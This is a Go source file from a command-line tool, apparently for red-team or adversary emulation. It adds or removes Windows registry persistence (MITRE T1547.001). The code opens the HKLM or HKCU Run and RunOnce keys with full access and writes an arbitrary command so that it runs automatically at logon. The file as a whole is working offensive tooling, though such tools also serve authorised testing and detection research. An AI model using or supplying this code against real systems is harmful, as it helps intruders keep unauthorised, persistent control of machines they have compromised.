package techniques

import (
	"golang.org/x/sys/windows/registry"
	"log"
	"fmt"
	"github.com/spf13/cobra"
)

var (
	// arguments
	regValue string
	regKey string
	// cobra
	regCmd = &cobra.Command{
		Use: "registry",
		Short: "Persistence using the run or runonce registry key (T1547.001)",
		Run: regPersist,
	}
)

func init(){
	rootCmd.AddCommand(regCmd)
	regCmd.Flags().StringVarP(&regValue, "value", "v", "*a", "Set the registry value to be set for persistence")
	regCmd.Flags().StringVarP(&regKey, "key", "k", "hklmrunonce", "Specify the registry key to be edited for persistence, options include:\n- hklmrunonce: RunOnce key under HKEY LOCAL_MACHINE\n- hklmrun: Run key under HKEY LOCAL_MACHINE\n- hkcurunonce: RunOnce key under HKEY CURRENT_USER\n- hkcurun: Run key under HKEY CURRENT_USER\n")
	regCmd.Flags().StringVarP(&method, "method", "m", "", "Add or remove the persistence technique (add will overwrite the registry key if it already exists) (required)")
	regCmd.MarkFlagRequired("method")
	regCmd.Flags().StringVarP(&com, "command", "c", "", "Command to execute for persistence (required with the add method)")
	if method == "add"{
		regCmd.MarkFlagRequired("command")
	}
}

func regPersist(cmd *cobra.Command, args []string){
	fmt.Printf("[+] Attempting to %s registry persistence with the %s registry key option\n", method, regKey)

	// initializes the hivekey and hivepath variables and sets them based on the registry key option
	var hivekey registry.Key
	var hivepath string

	if regKey == "hklmrunonce"{
		hivekey = registry.LOCAL_MACHINE
		hivepath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
	} else if regKey == "hklmrun"{
		hivekey = registry.LOCAL_MACHINE
		hivepath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
	} else if regKey == "hkcurunonce"{
		hivekey = registry.CURRENT_USER
		hivepath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
	} else if regKey == "hkcurun"{
		hivekey = registry.CURRENT_USER
		hivepath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
	} else {
		fmt.Printf("[!] %s is not a valid registry key option\n", regKey)
		return
	}
	// attempts to open the registry key with all access
	key, err := registry.OpenKey(hivekey, hivepath, registry.ALL_ACCESS)
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Print("[+] Opened the registry key with all access\n")

	// checks method and attempts to set the persistence method or remove it
	if method == "add"{
		err = key.SetStringValue(regValue, com)
		if err != nil {
			log.Fatalln(err)
		}
		err = key.Close()
		if err != nil {
			log.Fatalln(err)
		}
		fmt.Printf("[+] Successfully set the %s registry value with \"%s\"!\n", regValue, com)
	} else if method == "remove" {
		err = key.DeleteValue(regValue)
		if err != nil {
			log.Fatalln(err)
		}
		err = key.Close()
		if err != nil {
			log.Fatalln(err)
		}
		fmt.Printf("[+] Successfully removed the %s registry value!\n", regValue)
	} else {
		fmt.Printf("[!] %s is not a valid method for registry persistence", method)
		return
	}
}